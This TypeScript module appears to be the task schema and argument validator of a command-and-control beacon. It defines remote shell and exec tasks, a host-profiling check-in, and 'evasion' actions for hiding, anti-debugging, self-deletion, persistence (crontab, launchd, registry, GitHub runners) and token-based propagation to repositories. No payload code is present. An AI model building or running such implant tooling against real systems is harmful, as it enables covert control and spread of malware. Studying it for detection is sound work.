import type { ChannelKind } from "./channels.ts";
import { canonicalJsonBytes } from "./canonical.ts";

export interface ShellTaskArgs {
  cmd: string;
  cwd?: string;
  timeout?: number;
}

export interface ExecTaskArgs {
  cmd: string;
  args?: string[];
  cwd?: string;
  timeout?: number;
}

export type NoTaskArgs = Readonly<Record<string, never>>;

export interface SleepTaskArgs {
  seconds: number;
  jitter?: number;
}

export type EvasionAction =
  | "hide"
  | "anti_debug"
  | "sleep"
  | "self_delete"
  | "status"
  | "persist"
  | "propagate";

export type PersistenceMethod =
  | "auto"
  | "crontab"
  | "launchd"
  | "registry"
  | "gh-runner"
  | "gh-runner-register";

export type EvasionTaskArgs =
  | { action: "hide" | "anti_debug" | "self_delete" | "status" }
  | { action: "sleep"; baseMs?: number; jitter?: number }
  | { action: "persist"; method?: PersistenceMethod }
  | {
      action: "propagate";
      confirm: "propagate";
      token: string;
      owner: string;
      repoName: string;
    };

export interface TaskArgsByKind {
  shell: ShellTaskArgs;
  exec: ExecTaskArgs;
  ping: NoTaskArgs;
  sleep: SleepTaskArgs;
  kill: NoTaskArgs;
  evasion: EvasionTaskArgs;
}

export type TaskKind = keyof TaskArgsByKind;
export type TaskArgs = TaskArgsByKind[TaskKind];
export type TaskState = "pending" | "delivered" | "completed" | "failed";

/**
 * Task wire shape after the kind has been accepted by the public catalog.
 *
 * `args` remains a record here because most transports parse untrusted JSON
 * before dispatch. Use `assertTaskArgs()` at that boundary to obtain the
 * corresponding `TaskArgsByKind[K]`.
 */
export interface Task {
  taskId: string;
  kind: TaskKind;
  args: Record<string, unknown>;
  ref?: string | undefined;
  issuedAt?: string | undefined;
  preferredChannel?: ChannelKind | undefined;
}

export type ValidatedTask<K extends TaskKind = TaskKind> = K extends TaskKind
  ? Omit<Task, "kind" | "args"> & {
      kind: K;
      args: TaskArgsByKind[K];
    }
  : never;

export interface TaskResult {
  taskId: string;
  beaconId: string;
  success: boolean;
  output: string;
  data?: string | undefined;
  completedAt: string;
  /**
   * Transitional wire field. New transports sign a `task-result` envelope;
   * callers must not treat absence of this legacy field as authenticated.
   */
  signature?: string | undefined;
  metadata?: Record<string, unknown> | undefined;
}

export interface ResultAcceptanceReceipt {
  kind: "result-acceptance";
  beaconId: string;
  taskId: string;
  resultDigest: string;
  acceptedAt: string;
}

const RESULT_ACCEPTANCE_RECEIPT_KEYS = Object.freeze([
  "acceptedAt",
  "beaconId",
  "kind",
  "resultDigest",
  "taskId",
]);

/**
 * Digest the exact signed task-result wire object. The signature and the
 * presence of every optional field are part of the controller acceptance
 * binding, so a receipt cannot acknowledge a conflicting re-signing.
 */
export async function computeTaskResultDigest(
  result: TaskResult,
): Promise<string> {
  const serialized = canonicalJsonBytes(result);
  // Copy into an ArrayBuffer-backed view. DOM Web Crypto typings reject a
  // generic ArrayBufferLike view because it could wrap SharedArrayBuffer.
  const digestInput = new Uint8Array(serialized.byteLength);
  digestInput.set(serialized);
  const digest = new Uint8Array(
    await crypto.subtle.digest("SHA-256", digestInput),
  );
  return Array.from(digest, (byte) => byte.toString(16).padStart(2, "0"))
    .join("");
}

export function parseResultAcceptanceReceipt(
  value: unknown,
): ResultAcceptanceReceipt {
  if (!isPlainRecord(value)) {
    throw new Error("result acceptance receipt must be a plain object");
  }
  const keys = Object.keys(value).sort();
  if (
    keys.length !== RESULT_ACCEPTANCE_RECEIPT_KEYS.length ||
    keys.some((key, index) => key !== RESULT_ACCEPTANCE_RECEIPT_KEYS[index])
  ) {
    throw new Error("result acceptance receipt has an invalid shape");
  }
  if (value["kind"] !== "result-acceptance") {
    throw new Error("result acceptance receipt has an invalid kind");
  }
  const beaconId = value["beaconId"];
  const taskId = value["taskId"];
  const resultDigest = value["resultDigest"];
  const acceptedAt = value["acceptedAt"];
  if (typeof beaconId !== "string" || beaconId.length === 0) {
    throw new Error("result acceptance receipt is missing beaconId");
  }
  if (typeof taskId !== "string" || taskId.length === 0) {
    throw new Error("result acceptance receipt is missing taskId");
  }
  if (
    typeof resultDigest !== "string" ||
    !/^[0-9a-f]{64}$/.test(resultDigest)
  ) {
    throw new Error("result acceptance receipt has an invalid resultDigest");
  }
  if (
    typeof acceptedAt !== "string" ||
    !Number.isFinite(Date.parse(acceptedAt)) ||
    new Date(acceptedAt).toISOString() !== acceptedAt
  ) {
    throw new Error("result acceptance receipt has an invalid acceptedAt");
  }
  return {
    kind: "result-acceptance",
    beaconId,
    taskId,
    resultDigest,
    acceptedAt,
  };
}

export interface CheckinPayload {
  beaconId: string;
  /** X25519 encryption public key, encoded as unpadded base64url. */
  publicKey: string;
  hostname: string;
  username: string;
  os: string;
  arch: string;
  pid: number;
  checkinAt: string;
  /** Required by production transports; optional only for staged migration. */
  identity?: import("./envelopes.ts").SignedEnvelope<"checkin">;
}

export type TaskValidationCode =
  | "invalid-kind"
  | "invalid-type"
  | "missing"
  | "unknown-field"
  | "out-of-range"
  | "invalid-value";

export interface TaskValidationIssue {
  readonly path: string;
  readonly code: TaskValidationCode;
  readonly message: string;
}

export type TaskValidationResult<T> =
  | { readonly ok: true; readonly value: T }
  | { readonly ok: false; readonly issues: readonly TaskValidationIssue[] };

export type TaskArgumentValidator<K extends TaskKind> = (
  input: unknown,
) => TaskValidationResult<TaskArgsByKind[K]>;

export interface TaskCatalogEntry<K extends TaskKind> {
  readonly kind: K;
  readonly description: string;
  readonly risk: "routine" | "elevated" | "destructive";
  readonly validate: TaskArgumentValidator<K>;
}

const MAX_COMMAND_LENGTH = 32_768;
const MAX_PATH_LENGTH = 4_096;
const MAX_TIMEOUT_MS = 5 * 60 * 1_000;
const MAX_SLEEP_SECONDS = 24 * 60 * 60;
const MAX_EVASION_SLEEP_MS = 24 * 60 * 60 * 1_000;

function issue(
  path: string,
  code: TaskValidationCode,
  message: string,
): TaskValidationIssue {
  return { path, code, message };
}

function isPlainRecord(value: unknown): value is Record<string, unknown> {
  if (typeof value !== "object" || value === null || Array.isArray(value)) {
    return false;
  }
  const prototype = Object.getPrototypeOf(value);
  return prototype === Object.prototype || prototype === null;
}

function readRecord(
  input: unknown,
): TaskValidationResult<Record<string, unknown>> {
  if (!isPlainRecord(input)) {
    return {
      ok: false,
      issues: [issue("$", "invalid-type", "task args must be a plain object")],
    };
  }
  return { ok: true, value: input };
}

function rejectUnknownFields(
  record: Record<string, unknown>,
  allowed: readonly string[],
): TaskValidationIssue[] {
  const allowedSet = new Set(allowed);
  return Object.keys(record)
    .filter((key) => !allowedSet.has(key))
    .sort()
    .map((key) =>
      issue(`$.${key}`, "unknown-field", `unknown task argument '${key}'`)
    );
}

function requiredString(
  record: Record<string, unknown>,
  key: string,
  maxLength: number,
): { value?: string; issues: TaskValidationIssue[] } {
  const value = record[key];
  if (value === undefined) {
    return {
      issues: [issue(`$.${key}`, "missing", `'${key}' is required`)],
    };
  }
  if (typeof value !== "string") {
    return {
      issues: [issue(`$.${key}`, "invalid-type", `'${key}' must be a string`)],
    };
  }
  const normalized = value.trim();
  if (normalized.length === 0 || normalized.length > maxLength) {
    return {
      issues: [
        issue(
          `$.${key}`,
          "invalid-value",
          `'${key}' must contain 1-${maxLength} non-whitespace characters`,
        ),
      ],
    };
  }
  return { value: normalized, issues: [] };
}

function optionalString(
  record: Record<string, unknown>,
  key: string,
  maxLength: number,
): { value?: string; issues: TaskValidationIssue[] } {
  if (record[key] === undefined) return { issues: [] };
  return requiredString(record, key, maxLength);
}

function numberInRange(
  record: Record<string, unknown>,
  key: string,
  minimum: number,
  maximum: number,
  options: { required: boolean; integer: boolean },
): { value?: number; issues: TaskValidationIssue[] } {
  const value = record[key];
  if (value === undefined) {
    return options.required
      ? { issues: [issue(`$.${key}`, "missing", `'${key}' is required`)] }
      : { issues: [] };
  }
  if (
    typeof value !== "number" ||
    !Number.isFinite(value) ||
    (options.integer && !Number.isInteger(value))
  ) {
    return {
      issues: [
        issue(
          `$.${key}`,
          "invalid-type",
          `'${key}' must be a finite ${options.integer ? "integer" : "number"}`,
        ),
      ],
    };
  }
  if (value < minimum || value > maximum) {
    return {
      issues: [
        issue(
          `$.${key}`,
          "out-of-range",
          `'${key}' must be between ${minimum} and ${maximum}`,
        ),
      ],
    };
  }
  return { value, issues: [] };
}

function validateShellArgs(
  input: unknown,
): TaskValidationResult<ShellTaskArgs> {
  const parsed = readRecord(input);
  if (!parsed.ok) return parsed;
  const record = parsed.value;
  const cmd = requiredString(record, "cmd", MAX_COMMAND_LENGTH);
  const cwd = optionalString(record, "cwd", MAX_PATH_LENGTH);
  const timeout = numberInRange(record, "timeout", 1, MAX_TIMEOUT_MS, {
    required: false,
    integer: true,
  });
  const issues = [
    ...rejectUnknownFields(record, ["cmd", "cwd", "timeout"]),
    ...cmd.issues,
    ...cwd.issues,
    ...timeout.issues,
  ];
  if (issues.length > 0 || cmd.value === undefined) {
    return { ok: false, issues };
  }
  return {
    ok: true,
    value: {
      cmd: cmd.value,
      ...(cwd.value !== undefined && { cwd: cwd.value }),
      ...(timeout.value !== undefined && { timeout: timeout.value }),
    },
  };
}

function validateExecArgs(
  input: unknown,
): TaskValidationResult<ExecTaskArgs> {
  const parsed = readRecord(input);
  if (!parsed.ok) return parsed;
  const record = parsed.value;
  const cmd = requiredString(record, "cmd", MAX_COMMAND_LENGTH);
  const cwd = optionalString(record, "cwd", MAX_PATH_LENGTH);
  const timeout = numberInRange(record, "timeout", 1, MAX_TIMEOUT_MS, {
    required: false,
    integer: true,
  });
  const issues = [
    ...rejectUnknownFields(record, ["cmd", "args", "cwd", "timeout"]),
    ...cmd.issues,
    ...cwd.issues,
    ...timeout.issues,
  ];

  let args: string[] | undefined;
  const rawArgs = record["args"];
  if (rawArgs !== undefined) {
    const candidate = typeof rawArgs === "string" ? [rawArgs] : rawArgs;
    if (
      !Array.isArray(candidate) ||
      candidate.some((entry) => typeof entry !== "string")
    ) {
      issues.push(
        issue("$.args", "invalid-type", "'args' must be a string or string array"),
      );
    } else if (
      candidate.length > 256 ||
      candidate.some((entry) => entry.length > MAX_COMMAND_LENGTH)
    ) {
      issues.push(
        issue(
          "$.args",
          "out-of-range",
          "'args' may contain at most 256 strings of at most 32768 characters",
        ),
      );
    } else {
      args = [...candidate];
    }
  }

  if (issues.length > 0 || cmd.value === undefined) {
    return { ok: false, issues };
  }
  return {
    ok: true,
    value: {
      cmd: cmd.value,
      ...(args !== undefined && { args }),
      ...(cwd.value !== undefined && { cwd: cwd.value }),
      ...(timeout.value !== undefined && { timeout: timeout.value }),
    },
  };
}

function validateNoArgs(input: unknown): TaskValidationResult<NoTaskArgs> {
  const parsed = readRecord(input);
  if (!parsed.ok) return parsed;
  const issues = rejectUnknownFields(parsed.value, []);
  return issues.length > 0
    ? { ok: false, issues }
    : { ok: true, value: {} };
}

function validateSleepArgs(
  input: unknown,
): TaskValidationResult<SleepTaskArgs> {
  const parsed = readRecord(input);
  if (!parsed.ok) return parsed;
  const record = parsed.value;
  const seconds = numberInRange(record, "seconds", 1, MAX_SLEEP_SECONDS, {
    required: true,
    integer: true,
  });
  const jitter = numberInRange(record, "jitter", 0, 1, {
    required: false,
    integer: false,
  });
  const issues = [
    ...rejectUnknownFields(record, ["seconds", "jitter"]),
    ...seconds.issues,
    ...jitter.issues,
  ];
  if (issues.length > 0 || seconds.value === undefined) {
    return { ok: false, issues };
  }
  return {
    ok: true,
    value: {
      seconds: seconds.value,
      ...(jitter.value !== undefined && { jitter: jitter.value }),
    },
  };
}

const EVASION_ACTIONS = new Set<EvasionAction>([
  "hide",
  "anti_debug",
  "sleep",
  "self_delete",
  "status",
  "persist",
  "propagate",
]);

const PERSISTENCE_METHODS = new Set<PersistenceMethod>([
  "auto",
  "crontab",
  "launchd",
  "registry",
  "gh-runner",
  "gh-runner-register",
]);

function validateEvasionArgs(
  input: unknown,
): TaskValidationResult<EvasionTaskArgs> {
  const parsed = readRecord(input);
  if (!parsed.ok) return parsed;
  const record = parsed.value;
  const rawAction = record["action"];
  if (typeof rawAction !== "string" || !EVASION_ACTIONS.has(rawAction as EvasionAction)) {
    return {
      ok: false,
      issues: [
        issue(
          "$.action",
          rawAction === undefined ? "missing" : "invalid-value",
          `'action' must be one of: ${[...EVASION_ACTIONS].join(", ")}`,
        ),
      ],
    };
  }
  const action = rawAction as EvasionAction;

  if (
    action === "hide" ||
    action === "anti_debug" ||
    action === "self_delete" ||
    action === "status"
  ) {
    const issues = rejectUnknownFields(record, ["action"]);
    return issues.length > 0
      ? { ok: false, issues }
      : { ok: true, value: { action } };
  }

  if (action === "sleep") {
    const baseMs = numberInRange(record, "baseMs", 1, MAX_EVASION_SLEEP_MS, {
      required: false,
      integer: true,
    });
    const jitter = numberInRange(record, "jitter", 0, 1, {
      required: false,
      integer: false,
    });
    const issues = [
      ...rejectUnknownFields(record, ["action", "baseMs", "jitter"]),
      ...baseMs.issues,
      ...jitter.issues,
    ];
    return issues.length > 0
      ? { ok: false, issues }
      : {
          ok: true,
          value: {
            action,
            ...(baseMs.value !== undefined && { baseMs: baseMs.value }),
            ...(jitter.value !== undefined && { jitter: jitter.value }),
          },
        };
  }

  if (action === "persist") {
    const issues = rejectUnknownFields(record, ["action", "method"]);
    const rawMethod = record["method"];
    if (
      rawMethod !== undefined &&
      (typeof rawMethod !== "string" ||
        !PERSISTENCE_METHODS.has(rawMethod as PersistenceMethod))
    ) {
      issues.push(
        issue(
          "$.method",
          "invalid-value",
          `'method' must be one of: ${[...PERSISTENCE_METHODS].join(", ")}`,
        ),
      );
    }
    if (issues.length > 0) return { ok: false, issues };
    return {
      ok: true,
      value: {
        action,
        ...(rawMethod !== undefined && { method: rawMethod as PersistenceMethod }),
      },
    };
  }

  const confirm = record["confirm"];
  const token = requiredString(record, "token", 8_192);
  const owner = requiredString(record, "owner", 256);
  const repoName = requiredString(record, "repoName", 256);
  const issues = [
    ...rejectUnknownFields(record, [
      "action",
      "confirm",
      "token",
      "owner",
      "repoName",
    ]),
    ...(confirm === "propagate"
      ? []
      : [
          issue(
            "$.confirm",
            confirm === undefined ? "missing" : "invalid-value",
            "'confirm' must equal 'propagate'",
          ),
        ]),
    ...token.issues,
    ...owner.issues,
    ...repoName.issues,
  ];
  if (
    issues.length > 0 ||
    token.value === undefined ||
    owner.value === undefined ||
    repoName.value === undefined
  ) {
    return { ok: false, issues };
  }
  return {
    ok: true,
    value: {
      action: "propagate",
      confirm: "propagate",
      token: token.value,
      owner: owner.value,
      repoName: repoName.value,
    },
  };
}

export const TASK_CATALOG = Object.freeze({
  shell: {
    kind: "shell",
    description: "Execute a command through the platform shell.",
    risk: "elevated",
    validate: validateShellArgs,
  },
  exec: {
    kind: "exec",
    description: "Execute a program directly with an argument vector.",
    risk: "elevated",
    validate: validateExecArgs,
  },
  ping: {
    kind: "ping",
    description: "Return a connectivity and process metadata probe.",
    risk: "routine",
    validate: validateNoArgs,
  },
  sleep: {
    kind: "sleep",
    description: "Update the beacon check-in interval and optional jitter.",
    risk: "routine",
    validate: validateSleepArgs,
  },
  kill: {
    kind: "kill",
    description: "Terminate the beacon process.",
    risk: "destructive",
    validate: validateNoArgs,
  },
  evasion: {
    kind: "evasion",
    description: "Invoke an implemented, explicitly selected evasion action.",
    risk: "destructive",
    validate: validateEvasionArgs,
  },
} satisfies { [K in TaskKind]: TaskCatalogEntry<K> });

export const TASK_KINDS = Object.freeze(
  Object.keys(TASK_CATALOG) as TaskKind[],
) as readonly TaskKind[];

export function isTaskKind(value: unknown): value is TaskKind {
  return typeof value === "string" &&
    Object.prototype.hasOwnProperty.call(TASK_CATALOG, value);
}

export function validateTaskArgs<K extends TaskKind>(
  kind: K,
  input: unknown,
): TaskValidationResult<TaskArgsByKind[K]>;
export function validateTaskArgs(
  kind: string,
  input: unknown,
): TaskValidationResult<TaskArgs>;
export function validateTaskArgs(
  kind: string,
  input: unknown,
): TaskValidationResult<TaskArgs> {
  if (!isTaskKind(kind)) {
    return {
      ok: false,
      issues: [
        issue(
          "$.kind",
          "invalid-kind",
          `unsupported task kind '${kind}'; expected one of: ${TASK_KINDS.join(", ")}`,
        ),
      ],
    };
  }
  const validator = TASK_CATALOG[kind].validate as (
    value: unknown,
  ) => TaskValidationResult<TaskArgs>;
  return validator(input);
}

export class TaskArgumentValidationError extends Error {
  readonly kind: string;
  readonly issues: readonly TaskValidationIssue[];

  constructor(kind: string, issues: readonly TaskValidationIssue[]) {
    super(
      `invalid arguments for task '${kind}': ${issues
        .map((entry) => `${entry.path}: ${entry.message}`)
        .join("; ")}`,
    );
    this.name = "TaskArgumentValidationError";
    this.kind = kind;
    this.issues = issues;
  }
}

export function assertTaskArgs<K extends TaskKind>(
  kind: K,
  input: unknown,
): TaskArgsByKind[K] {
  const result = validateTaskArgs(kind, input);
  if (!result.ok) {
    throw new TaskArgumentValidationError(kind, result.issues);
  }
  return result.value;
}
